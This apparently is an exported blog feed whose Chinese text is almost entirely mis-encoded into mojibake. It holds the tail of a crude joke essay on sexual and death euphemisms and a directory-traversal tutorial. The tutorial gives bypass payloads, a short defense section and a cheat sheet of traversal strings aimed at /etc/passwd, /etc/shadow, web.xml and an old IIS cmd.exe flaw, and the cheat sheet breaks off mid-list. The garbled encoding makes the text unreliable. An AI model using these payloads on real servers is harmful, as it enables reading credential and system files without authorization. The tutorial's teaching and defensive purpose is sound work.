ã€‚é¦–å…ˆè¦ä¼šåšæ¢¦ï¼Œæ¢¦æ„Ÿè¦æå¼ºï¼æœ€å¥½èƒ½ä»¤äººæµ®æƒ³è”ç¿©ã€‚æˆ˜å›½æ—¶å®‹ç‰çš„ã€Šé«˜å”èµ‹ã€‹æœ‰è¨€ï¼š</p><hr><p>æ˜”è€…å…ˆç‹æ¢¦è§ä¸€å¦‡äººæ›°ï¼šå¦¾ï¼Œå·«å±±ä¹‹å¥³ä¹Ÿï¼Œæ„¿èæ•å¸­ã€‚</p><p>å…ˆç‹é—®ï¼šä½ å¹²å˜›çš„ï¼Ÿæˆ‘å¯ä¸æ˜¯éšä¾¿çš„äºº</p><p>å¦‡äººç­”ï¼šå¦¾æ—¦ä¸ºæœäº‘ï¼Œæš®ä¸ºè¡Œé›¨ã€‚</p><hr><p>äºæ˜¯å…ˆç‹ç¡äº†ä¸€ä¸ªæ™¨å˜äº‘æœµï¼Œæ™šå˜çƒŸé›¨çš„å¥³å­ã€‚ä»–ä»¬ç¡çš„è¿‡ç¨‹å°±è¢«å¤§å®¶ç²—æš´åœ°è®¤ä¸ºæ˜¯â€œå·«å±±äº‘é›¨â€ã€‚â€œå·«å±±â€â€œäº‘é›¨â€ä¸¤ä¸ªè¯è´´åˆ‡å•Šï¼å·«å±±äº‘é›¨æ˜¯åºŠç¬«ä¹‹æ¬¢ã€‚æ›¹é›ªèŠ¹åœ¨ã€Šçº¢æ¥¼æ¢¦ã€‹ç¬¬å…­å›â€œå®ç‰åˆè¯•äº‘é›¨æƒ…â€ä¸­å†™çš„å°±æ˜¯è´¾å®ç‰ä¸ä¸«ç¯è¢­äººæˆ¿äº‹ä¹‹æ—¶çš„æƒ…æ™¯ï¼Œä½†æ­¤å¤„è´¾å®ç‰æºè¢­äººè¡Œæˆ¿äº‹æœ‰æ²¡æœ‰é‚£å•¥é‚£å•¥é‚£å•¥é‚£å•¥é‚£å•¥å¿«ä¹å’±ä»¬å°±ä¸å¾—è€ŒçŸ¥äº†ã€‚</p><p>å…¶æ¬¡è¦ä¼šè”æƒ³ï¼Œé¢ é¸¾å€’å‡¤ï¼Œé¸¾æ˜¯ç¥é¸Ÿï¼Œå‡¤å°±æ˜¯å‡¤å‡°ã€‚é¢ é¸¾å€’å‡¤çš„æœ¬æ„æ¯”å–»é¢ å€’æ¬¡åºã€‚å¦‚æœå°†é¢ é¸¾å€’å‡¤ç”¨äºäººèº«ä¸Šï¼Œå°±æœ‰äº†ç”·å¥³äº¤æ¬¢ä¹‹æ„ã€‚å…ƒä»£ç‹å®ç”«ã€Šè¥¿å¢è®°ã€‹ç¬¬å››æœ¬ç¬¬äºŒæŠ˜ä¸­æœ‰ï¼šâ€œä½ ç»£å¸·é‡Œæ•ˆç»¸ç¼ªï¼Œé¢ é¸¾å€’å‡¤ç™¾äº‹æœ‰â€çš„è®°è½½ï¼Œã€Šçº¢æ¥¼æ¢¦ã€‹ç¬¬å…­åäº”å›ä¹Ÿæœ‰â€œæ˜¯å¤œï¼Œè´¾çå’Œä»–é¢ é¸¾å€’å‡¤ï¼Œç™¾èˆ¬æ©çˆ±â€ã€‚å§¿åŠ¿å¾ˆä¸°å¯Œå˜›ã€‚ç”¨ç°åœ¨çš„è¯æ¥è¯´ï¼Œå°±æ˜¯6ï¸âƒ£9ï¸âƒ£ã€‚ä¸€æ6ï¸âƒ£9ï¸âƒ£ï¼Œè€å¸æœºä¼šå¿ƒä¸€ç¬‘ï¼Œé¢ é¸¾å€’å‡¤å°±æ˜¾å¾—æ›´åŠ è€äººå¯»å‘³ã€‚</p><p>è¯´åˆ°å†…æ¶µï¼Œå…ƒæœç‹å®ç”«åœ¨ã€Šè¥¿å¢è®°ã€‹ä¸­çš„å¦å¤–ä¸€ä¸ªè¯è¯­â€”â€”é±¼æ°´ä¹‹æ¬¢æ›´åŠ æœ‰å†…æ¶µã€‚é±¼å’Œæ°´çš„æ•…äº‹æœ€æ—©å‡ºè‡ªäºåè‘—ã€Šä¸‰å›½æ¼”ä¹‰ã€‹ä¸­ï¼Œåˆ˜å¤‡å¯¹è¯¸è‘›äº®çš„è¯„è¯­å°±æ˜¯ï¼šå¾å¾—å­”æ˜ï¼ŒçŠ¹é±¼ä¹‹å¾—æ°´ä¹Ÿã€‚å½¢å®¹èæ´½çš„åˆä½œä¼´ä¾£çš„å…³ç³»ã€‚å½“åˆä½œä¼´ä¾£å˜ä¸ºç”·äººå’Œå¥³äººçš„æ—¶å€™ï¼Œâ€œå¦‚é±¼å¾—æ°´â€ä¹Ÿå°±æ¼”å˜æˆä¸ºäº†â€œé±¼æ°´ä¹‹æ¬¢â€ã€‚è¿™ç±»è¯è¿˜æœ‰å¾ˆå¤šï¼Œâ€œäºé£ä¹‹æ„¿â€â€œäº‘æœé›¨æš®â€â€œç®¡é²ä¹‹äº¤â€â€¦â€¦ï¼ˆç”¨çš„å¼€å¿ƒï¼Œæ‰æ˜¯çœŸçš„å¥½~ï¼‰</p><p>ä½ å–œæ¬¢â€œmake loveâ€ï¼ŒğŸ‘´å–œæ¬¢â€œæœäº‘æš®é›¨â€ï¼Œä½ å–œæ¬¢â€œçº¦å—ï¼Ÿâ€ï¼ŒğŸ‘´å–œæ¬¢â€œèŠ±æ˜æœˆæš—ç¬¼è½»é›¾ï¼Œä»Šå®µå¥½å‘éƒè¾¹å»â€ã€‚ä¸­æ–‡çš„åšå¤§ç²¾æ·±åœ¨å§”å©‰è¿™é‡Œä¹ŸçœŸæ˜¯ä½“ç°å¾—æ·‹æ¼“å°½è‡´ï¼Œæ¯”èµ·ä¸€ä¸ä¸æŒ‚ï¼Œæˆ‘ä»¬æ›´å–œæ¬¢æµ´éœ¸è¿˜ä¼‘ï¼ˆbushi</p><p>è¯´æ¥ï¼Œä½ å»åŒ»é™¢å¯ä»¥ç›´æ¥ç”¨â€œèŠèŠ±â€è¿™ä¸ªè¯æ±‡æ¥è¡¨è¾¾ï¼ŒåŒ»ç”Ÿéƒ½èƒ½å¤Ÿåˆ†åˆ†é’Ÿç†è§£ä½ çš„å«ä¹‰ã€‚ä¸è¿‡ï¼Œåˆ«æŒ‡æœ›è¿™ä¸ªè¯æ±‡ä¼šå‡ºç°åœ¨ä½ çš„ç—…å†ä¸Šï¼ŒåŒ»ç”Ÿå¯æ²¡æœ‰ä½ é‚£ä¹ˆå¹½é»˜ã€‚è¯´åˆ°åŒ»é™¢å’ŒåŒ»ç”Ÿï¼Œæˆ‘ä»¬å†æ¥èŠèŠåˆ«çš„ï¼Œåˆšæ‰ä¼¼ä¹å¼€ğŸš—å¼€è¿‡å¤´äº†ï¼Œå’³å’³ã€‚</p><p>ä¸æ‰¯è¿œäº†ï¼Œæˆ‘ä»¬ç»§ç»­å›åˆ°è¯é¢˜ï¼Œè™½ç„¶è¯´ç”Ÿè€ç—…æ­»æ˜¯äººé—´å¸¸æ€ï¼Œä½†æ˜¯å¯¹äºæ­»è¿™ä¸ªå­—ï¼Œäººä»¬è¿˜æ˜¯å¾ˆæœ‰å¿Œè®³çš„ï¼Œä»å¤è‡³ä»Šï¼Œäººä»¬éƒ½åœ¨å¯»æ‰¾å¯ä»¥æ›¿ä»£æ­»å­—çš„è¯æ±‡æˆ–è€…æ˜¯è¯´æ³•ï¼Œæ¯”å¦‚ï¼š</p><hr><p>äº¡ã€æ•…ã€å’ã€å¼±ã€é€ã€æ®ã€æ®ªã€æ¯™ã€æ®‚ã€å¾‚ã€æ®’ã€è–¨ã€æ­»äº¡ã€ä¸§äº¡ã€äº¡æ•…ã€èº«æ•…ã€ç‰©æ•…ã€ç‰©åŒ–ã€å»ä¸–ã€é€ä¸–ã€å¼ƒä¸–ã€è¿‡ä¸–ã€ä¸‹ä¸–ã€å°±ä¸–ã€è°¢ä¸–ã€å‡‹è°¢ã€æ­»ç­ã€æ¯™å‘½ã€æ¯•å‘½ã€æ®’å‘½ã€æ®’ç­ã€æèƒŒã€æé¦†ã€æ®‚è½ã€å¾‚è½ã€æ®‚è°¢ã€å¾‚è°¢ã€è¿åŒ–ã€æ€›åŒ–ã€ç–¾ç»ˆã€é•¿é€ã€æ°¸è¯€ã€æ°¸åˆ«ã€æ°¸çœ ã€é•¿çœ ã€å°±æœ¨ã€æ•…å»ã€æº˜é€ã€æº˜æ­»ã€æ–­æ°”ã€å’½æ°”ã€åˆçœ¼ã€é—­çœ¼ã€æ²¡äº†ã€æŒºè…¿ã€å®Œè›‹ã€å‘œå‘¼ã€å›è€å®¶ã€ç©å„¿å®Œã€ç¿˜è¾«å­ã€ä¸Šè¥¿å¤©ã€è§é˜ç‹ã€ç™»é¬¼å½•ã€å¡«æ²Ÿå£‘ã€ç²‰èº«ç¢éª¨ã€è§é©¬å…‹æ€ã€ä¸ä¸–é•¿è¾ã€æº˜ç„¶é•¿é€ã€å¯¿ç»ˆæ­£å¯ã€å‘½èµ´é»„æ³‰ã€å‘œå‘¼å“€å“‰ã€ä¸€å‘½å‘œå‘¼ã€å¤©å¤ºå…¶é­„ã€ä»™é€ã€ä»™æ¸¸ã€åƒå¤ã€ä½œå¤ã€å½’è¥¿ã€å½’å¤©ã€å¤§æ•…ã€ä¸åœ¨ã€è¿‡å»ã€ä¸ç¦„ã€ä¸è®³ã€ä¸å¯è®³ã€è·¨é¹¤è¥¿æ¸¸ã€åƒç§‹ä¹‹åã€ç™¾å¹´ä¹‹åˆã€ä¸‰é•¿ä¸¤çŸ­ã€å±±é«˜æ°´ä½ã€è§èƒŒã€å¼ƒå…»ã€ç‰ºç‰²ã€èˆèº«ã€çŒ®èº«ã€å°±ä¹‰ã€æèº¯ã€æç”Ÿã€æ®‰èŒã€æ®‰å›½ã€æ®‰éš¾ã€æ®‰èŠ‚ã€æ®‰ã€æ•ˆæ­»ã€æ•ˆå‘½ã€æˆå‘½ã€é˜µäº¡ã€æˆä»ã€æ€èº«æˆä»ã€èˆç”Ÿå–ä¹‰ã€ä»¥èº«è®¸å›½ã€é©¬é©è£¹å°¸ã€è‚è„‘ï¼ˆèƒ†ï¼‰æ¶‚åœ°ã€æ¨ªæ­»ã€å¼ºæ­»ã€å‡¶æ­»ã€ä¸§å‘½ã€é€å‘½ã€æ¯™å‘½ã€æš´å’ã€å€’å¤´ã€æ­»äºéå‘½ã€é¥¿æ­»ã€æ®£ã€å‡å¤©ã€æ¶…ç›˜ã€ååŒ–ã€ç¾½åŒ–ã€é¹¤åŒ–ã€ç‰©åŒ–ã€åœ†å¯‚ã€å½’å¯‚ã€ç¤ºå¯‚ã€å…¥å¯‚ã€å…¥ç­ã€ç­åº¦ã€ç¤ºç­ã€å°¸è§£ã€å´©ã€é©¾å´©ã€å±±é™µå´©ã€æ™é©¾ã€å‡éã€ç™»éã€å®¾å¤©ã€å¤§è¡Œã€åƒç§‹ä¸‡å²ã€å¤­æŠ˜ã€å¤­äº¡ã€çŸ­æŠ˜ã€æ—©ä¸–ã€æ—©é€ã€æ—©æ­»ã€ä¸­æ®‡ã€æ®‡ã€å…°æ‘§ç‰æŠ˜ã€ç‰æ¥¼èµ´å¬ã€ç‰æ¥¼ä¿®è®°ã€åœ°ä¸‹ä¿®æ–‡ã€è‘¬ç‰åŸ‹é¦™ã€ç‰æ®’é¦™æ¶ˆã€é¦™æ¶ˆç‰æ®’ã€å€Ÿå¥³ç¦»é­‚ã€å®¢æ­»ã€ç˜æ­»</p><hr><p>è¿™ä¹ˆä¸€åˆ—ï¼Œæ„ˆå‘æ„Ÿè§‰äººä»¬ä¸ºäº†é¿è®³èƒ½æœ‰å¤šå¼ºçš„åˆ›é€ èƒ½åŠ›ã€‚ï¼ˆå½“ç„¶ï¼Œè¿™äº›åªæ˜¯ç”¨ä»¥æ°´å­—æ•°çš„ï¼Œæˆ‘æ˜¯ä»€ä¹ˆäººï¼‰</p><p>å­¦ä¹ ä¹‹ä½™éšä¾¿ä¾ƒä¾ƒè¿™äº›æ„Ÿè§‰å·¨é¸¡å„¿ğŸ‘ï¼Œæ”¾æ¾å¿ƒæƒ…ï¼Œä»¤äººç¥æ¸…æ°”çˆ½ï¼Œå¥½åƒé¸½äº†<code>ä¸å¸¦è„å­—çš„éª‚äººè¯´æ³•</code>ä¸¤å›äº†ï¼Œä¸‹æ¬¡ç»§ç»­ğŸ•Šï¼Œæºœ</p><h2 id="0x03-å¯¹å˜²è®½çš„ä¸€ç‚¹æ€è€ƒ"><a href="#0x03-å¯¹å˜²è®½çš„ä¸€ç‚¹æ€è€ƒ" class="headerlink" title="0x03 å¯¹å˜²è®½çš„ä¸€ç‚¹æ€è€ƒ"></a>0x03 å¯¹å˜²è®½çš„ä¸€ç‚¹æ€è€ƒ</h2><p>ä»¥å‰å’Œæœ‹å‹ä¸€èµ·çœ‹åˆ«äººåƒé¸¡ï¼Œåªèƒ½è¯´é‚£ä¸ªäººçš„æ“ä½œç”¨æ¥å°±é¥­æˆ‘å¯ä»¥è¿åƒå››ç¢—ä¸å¸¦å–æ°´ï¼Œè€Œæˆ‘æœ‹å‹åˆ™ç”¨äº†ä¸€å¥å¾ˆæœ‰æ„æ€çš„è¯æ¥å½¢å®¹ä»–çš„æ“ä½œï¼Œä»¤æˆ‘ç°åœ¨å›æƒ³èµ·æ¥ï¼Œç»†ç»†ä¸€ç¢ç£¨ï¼Œè¶Šæƒ³è¶Šä¹å‘µï¼Œäºæ˜¯æœ‰äº†è¿™ç¯‡æ–‡ç« â€”â€”â€œæˆ‘å¥¶å¥¶æ¨ç€è½®æ¤…éƒ½å¯ä»¥ä»ä½ ç‹™é•œä¸‹è¿‡å»â€ã€‚ä½•å…¶å°–é…¸åˆ»è–„ï¼Œä½•å…¶ä¸€é˜µè§è¡€ï¼Œè¿™ä¸€ç±»ç‹­ä¹‰çš„å˜²è®½å’Œæ— è„‘å–·è¿œè¿œä¸åŒï¼Œå…¶å¾€å¾€è¯™è°å¹½é»˜è€Œåˆç›´æŒ‡çœŸç›¸ï¼Œåœ¨åšäººä¸€ç¬‘çš„åŒæ—¶ä¹Ÿæ¯«ä¸ç•™æƒ…åœ°æ­å¼€ä»–äººçš„é®ç¾å¸ƒã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çBB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆç›®å½•ç©¿è¶Š</title>
      <link href="2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
      <url>2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>ç›®å½•éå†ï¼ˆç›®å½•ç©¿è¶Šï¼‰æ˜¯ä¸€ä¸ªWebå®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è¯»å–è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚ è¿™å¯èƒ½åŒ…æ‹¬åº”ç”¨ç¨‹åºä»£ç å’Œæ•°æ®ï¼Œåç«¯ç³»ç»Ÿçš„ç™»å½•ä¿¡æ¯ä»¥åŠæ•æ„Ÿçš„æ“ä½œç³»ç»Ÿæ–‡ä»¶</p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿåœ¨æœåŠ¡å™¨ä¸Šå†™å…¥ä»»æ„æ–‡ä»¶ï¼Œï¼ˆå¦‚ï¼ŒFFFTP æ˜¯ä¸€æ¬¾å°å‹çš„ FTP å®¢æˆ·ç«¯è½¯ä»¶ã€‚FFFTPå®¢æˆ·ç«¯æ²¡æœ‰æ­£ç¡®åœ°éªŒè¯ FTP æœåŠ¡å™¨æ‰€è¿”å›çš„ LIST å‘½ä»¤å“åº”ä¸­åŒ…å«æœ‰ç›®å½•éå†åºåˆ—ï¼ˆæ–œçº¿ï¼‰çš„æ–‡ä»¶åï¼Œå¦‚æœç”¨æˆ·å—éª—ä»æ¶æ„çš„ FTP æœåŠ¡å™¨ä¸‹è½½çš„ç›®å½•åŒ…å«æœ‰å¸¦æœ‰æ¶æ„æ–‡ä»¶åçš„æ–‡ä»¶çš„è¯ï¼Œå°±å¯èƒ½å¯¼è‡´å‘ç”¨æˆ·ç³»ç»Ÿçš„ä»»æ„ä½ç½®å†™å…¥æ–‡ä»¶ï¼‰ä»è€Œå…è®¸ä»–ä»¬ä¿®æ”¹åº”ç”¨ç¨‹åºæ•°æ®æˆ–è¡Œä¸ºï¼Œå¹¶æœ€ç»ˆå®Œå…¨æ§åˆ¶æœåŠ¡å™¨</p><h2 id="å§¿åŠ¿"><a href="#å§¿åŠ¿" class="headerlink" title="å§¿åŠ¿"></a>å§¿åŠ¿</h2><h3 id="0x00-åŸºç¡€ç›®å½•éå†"><a href="#0x00-åŸºç¡€ç›®å½•éå†" class="headerlink" title="0x00 åŸºç¡€ç›®å½•éå†"></a>0x00 åŸºç¡€ç›®å½•éå†</h3><p>ç›´æ¥åˆ©ç”¨ ../ è¿”å›ä¸Šä¸€çº§æ¥éå†ä»»æ„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x01-ç»å¯¹è·¯å¾„"><a href="#0x01-ç»å¯¹è·¯å¾„" class="headerlink" title="0x01 ç»å¯¹è·¯å¾„"></a>0x01 ç»å¯¹è·¯å¾„</h3><p>webç½‘ç«™æœ‰æ—¶å€™ä¼šé‡‡å–ç›®å½•éå†çš„é˜²å¾¡æªæ–½ï¼Œå¦‚è¿‡æ»¤ ../ ä¸Šä¸€çº§ç­‰å…³é”®å­—ï¼Œç„¶åç®€å•çš„è¿‡æ»¤é€šå¸¸ä¼šè¢«ç»•è¿‡ã€‚æœ‰æ—¶å€™å¯ä»¥ç›´æ¥é‡‡ç”¨ç»å¯¹è·¯å¾„ï¼Œæ— é¡» ../ è¿”å›ä¸Šä¸€çº§ç›®å½•éå†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x02-åŒå†™-ç»•è¿‡"><a href="#0x02-åŒå†™-ç»•è¿‡" class="headerlink" title="0x02 åŒå†™../ç»•è¿‡"></a>0x02 åŒå†™../ç»•è¿‡</h3><p>æœ‰æ—¶å€™ï¼Œé˜²å¾¡æªæ–½æ˜¯ç›´æ¥å°† ../ æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥ç›´æ¥é‡‡ç”¨åŒå†™ç›´æ¥ç»•è¿‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x03-URLç¼–ç ç»•è¿‡"><a href="#0x03-URLç¼–ç ç»•è¿‡" class="headerlink" title="0x03 URLç¼–ç ç»•è¿‡"></a>0x03 URLç¼–ç ç»•è¿‡</h3><p>ä¹Ÿå¯ä»¥é‡‡ç”¨ URL ç¼–ç æ¥ç»•è¿‡æœåŠ¡å™¨å¯¹ . æˆ–è€… / çš„æ£€æµ‹</p><blockquote><p>.  =&gt; %2c</p><p>/  =&gt; %2f</p><p>% =&gt; %25 (åŒé‡URLç¼–ç )</p></blockquote><h3 id="0x04-ç»å¯¹è·¯å¾„é…åˆ"><a href="#0x04-ç»å¯¹è·¯å¾„é…åˆ" class="headerlink" title="0x04 ç»å¯¹è·¯å¾„é…åˆ ../"></a>0x04 ç»å¯¹è·¯å¾„é…åˆ ../</h3><p>æœ‰äº› web åœ¨è·å–æ–‡ä»¶æ—¶ï¼Œä¼šé¦–å…ˆåˆ¤æ–­æ˜¯å¦ä»¥ä¸€ä¸ªå›ºå®šçš„è·¯å¾„å¼€å¤´</p><p>é‚£ä¹ˆå°±å¯ä»¥é…åˆ ../ æ¥è¿”å›ä¸Šä¸€çº§éå†ä»»æ„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x05-æˆªæ–­æ–‡ä»¶åç¼€"><a href="#0x05-æˆªæ–­æ–‡ä»¶åç¼€" class="headerlink" title="0x05 æˆªæ–­æ–‡ä»¶åç¼€"></a>0x05 æˆªæ–­æ–‡ä»¶åç¼€</h3><p>æŸäº› web å¯¹æ–‡ä»¶ç±»å‹ä½œäº†é™åˆ¶ï¼Œåªæœ‰å½“åç¼€ä¸ºå›¾ç‰‡æ—¶æ‰è§£æ</p><p>è¿™æ—¶å€™å°±å¯ä»¥åˆ©ç”¨ %00 æ¥æˆªæ–­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00.jpg</span><br></pre></td></tr></table></figure><h3 id="0x0x"><a href="#0x0x" class="headerlink" title="0x0x"></a>0x0x</h3><p>è¦è¯»å–æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶çš„è¯ ../ å¯ä»¥éšæ„æ‹¼æ¥ä»»æ„ä¸ªï¼Œå°±åƒ ../../../../../../../../../../../../../../../../../../../../../../</p><p>å› ä¸ºåˆ°äº†æ ¹ç›®å½•å†è¿”å›ä¸Šçº§ç›®å½•ä¾ç„¶æ˜¯æ ¹ç›®å½•</p><h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><p>é˜²æ­¢æ–‡ä»¶è·¯å¾„éå†æ¼æ´çš„æœ€æœ‰æ•ˆæ–¹æ³•æ˜¯é¿å…å°†ç”¨æˆ·æä¾›çš„è¾“å…¥å®Œå…¨ä¼ é€’ç»™æ–‡ä»¶ç³»ç»ŸAPI</p><p>å¦‚æœè®¤ä¸ºä¸å¯é¿å…çš„æ˜¯å°†ç”¨æˆ·æä¾›çš„è¾“å…¥ä¼ é€’ç»™æ–‡ä»¶ç³»ç»Ÿ APIï¼Œåˆ™åº”åŒæ—¶ä½¿ç”¨ä¸¤å±‚é˜²å¾¡ï¼Œä»¥é˜²æ­¢å—åˆ°æ”»å‡»ï¼š</p><blockquote><ul><li>åº”ç”¨ç¨‹åºåº”åœ¨å¤„ç†ä¹‹å‰éªŒè¯ç”¨æˆ·è¾“å…¥ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼ŒéªŒè¯åº”ä¸å…è®¸å€¼çš„ç™½åå•è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ‰€éœ€çš„åŠŸèƒ½æ— æ³•åšåˆ°è¿™ä¸€ç‚¹ï¼Œåˆ™éªŒè¯åº”éªŒè¯è¾“å…¥å†…å®¹ä»…åŒ…å«å…è®¸çš„å†…å®¹ï¼Œä¾‹å¦‚çº¯å­—æ¯æ•°å­—å­—ç¬¦</li><li>éªŒè¯æä¾›çš„è¾“å…¥åï¼Œåº”ç”¨ç¨‹åºåº”å°†è¾“å…¥é™„åŠ åˆ°åŸºæœ¬ç›®å½•ï¼Œå¹¶ä½¿ç”¨å¹³å°æ–‡ä»¶ç³»ç»Ÿ API è§„èŒƒåŒ–è·¯å¾„ã€‚éªŒè¯è§„èŒƒåŒ–è·¯å¾„ä»¥é¢„æœŸçš„åŸºæœ¬ç›®å½•å¼€å¤´</li></ul></blockquote><h2 id="æ”»å‡»è·¯å¾„æ•´ç†"><a href="#æ”»å‡»è·¯å¾„æ•´ç†" class="headerlink" title="æ”»å‡»è·¯å¾„æ•´ç†"></a>æ”»å‡»è·¯å¾„æ•´ç†</h2><h3 id="æ–‡ä»¶æ•´ç†"><a href="#æ–‡ä»¶æ•´ç†" class="headerlink" title="æ–‡ä»¶æ•´ç†"></a>æ–‡ä»¶æ•´ç†</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc\hosts #Win10</span><br><span class="line">C:\boot.int  #Win7 éšè—æ–‡ä»¶</span><br><span class="line">web.xml  #Java Webé¡¹ç›®é…ç½®æ–‡ä»¶  </span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">C:\Program Files\mysql\my.ini  #Mysqlä¸‹é…ç½®æ–‡ä»¶</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;.htaccess</span><br><span class="line">&#x2F;phpinfo.php</span><br><span class="line">&#x2F;inc&#x2F;db.php</span><br><span class="line">&#x2F;inc&#x2F;conn.php</span><br><span class="line">&#x2F;Windows&#x2F;system.ini</span><br><span class="line"></span><br><span class="line"># Tomcat</span><br><span class="line">&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># Windows + IIS + asp</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;scripts&#x2F;..%5c..&#x2F;Windows&#x2F;System32&#x2F;cmd.exe?&#x2F;c+dir+c:\  # è€ç‰ˆæœ¬ - IIS CGIæ–‡ä»¶åè§£ç æ¼æ´</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;show.asp?view&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Windows&#x2F;system.ini</span><br></pre></td></tr></table></figure><h3 id="è·¯å¾„æ•´ç†"><a href="#è·¯å¾„æ•´ç†" class="headerlink" title="è·¯å¾„æ•´ç†"></a>è·¯å¾„æ•´ç†</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">xx.php?vt&#x3D;&amp;cate&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span 